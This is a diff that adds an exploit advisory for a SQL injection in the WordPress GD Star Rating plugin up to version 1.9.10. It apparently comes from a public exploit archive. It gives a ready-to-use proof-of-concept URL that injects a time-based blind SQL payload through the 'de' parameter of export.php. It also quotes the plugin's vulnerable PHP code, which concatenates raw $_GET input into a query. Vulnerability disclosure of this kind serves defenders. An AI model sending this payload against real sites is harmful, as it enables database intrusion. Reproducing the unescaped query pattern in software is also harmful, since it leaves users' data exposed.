@@ -1,0 +1,41 @@
+# Exploit Title: WordPress GD Star Rating plugin <= 1.9.10 SQL Injection Vulnerability
+# Date: 2011-09-26
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/gd-star-rating.zip
+# Version: 1.9.10 (tested)
+# Note: magic_quotes has to be turned off
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/gd-star-rating/export.php?ex=user&us=dummy&de=-1' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+
+---------------
+Vulnerable code
+---------------
+./export.php
+    require_once("./code/cls/export.php");
+    ...
+    if (isset($_GET["ex"])) {
+        $export_type = $_GET["ex"];
+        ...
+        switch($export_type) {
+            case "user":
+                header('Content-type: text/csv');
+                header('Content-Disposition: attachment; filename="gdsr_export_'.$export_name.'.csv"');
+                $sql = GDSRExport::export_users($_GET["us"], $_GET["de"], $get_data);
+                $rows = $wpdb->get_results($sql, ARRAY_N);
+
+./code/cls/export.php
+    class GDSRExport {
+        ...
+        function export_users($user_data = "min", $data_export = "article", $get_data = array()) {
+            ...
+            $where = array();
+            ...
+            $where[] = "v.vote_type = '".$data_export."'";
+            ...
+            $j_where = join(" and ", $where);
+            ...
+            return sprintf("select %s from %s where %s order by u.id",
+                    $j_select, $j_tables, $j_where);
